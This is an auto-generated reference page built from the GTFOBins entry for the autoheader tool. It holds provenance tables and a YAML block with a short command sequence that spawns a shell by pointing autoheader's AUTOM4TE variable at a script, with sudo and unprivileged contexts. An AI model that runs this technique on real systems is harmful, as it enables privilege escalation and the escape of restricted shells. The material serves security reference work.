---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# autoheader

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `autoheader` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/autoheader` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [autoheader](../../tools/linux/autoheader.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | autoheader |
| name | autoheader |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/autoheader/ |

## Preserved Source Material

```yaml
_body: ''
_name: autoheader
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/autoheader
functions:
  shell:
  - code: 'echo ''/bin/sh 1>&0'' >/path/to/temp-file

      chmod +x /path/to/temp-file

      touch configure.ac

      AUTOM4TE=/path/to/temp-file autoheader'
    contexts:
      sudo: null
      unprivileged: null
```
